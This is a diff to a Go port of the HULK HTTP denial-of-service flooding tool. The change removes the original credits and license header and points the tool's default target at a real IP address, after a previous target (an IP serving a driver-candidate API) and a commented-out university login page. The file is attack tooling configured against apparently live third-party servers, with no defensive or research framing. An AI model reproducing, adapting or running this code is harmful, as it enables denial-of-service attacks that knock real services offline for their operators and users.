@@ -1,12 +1,5 @@
 package main
 
-/*
- HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
- Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
- This go program licensed under GPLv3.
- Copyright Alexander I.Grafov <grafov@gmail.com>
-*/
-
 import (
 	"crypto/tls"
 	"flag"
@@ -104,7 +97,9 @@ func main() {
 	// flag.StringVar(&site, "site", "https://hemis.adu.uz/dashboard/login", "Destination site.")
 
 	// biznes
-	flag.StringVar(&site, "site", "https://62.209.144.97:8090/driver_candidate_api/v1/settings", "Destination site.")
+	// flag.StringVar(&site, "site", "https://62.209.144.97:8090/driver_candidate_api/v1/settings", "Destination site.")
+
+	flag.StringVar(&site, "site", "http://204.134.217.70", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
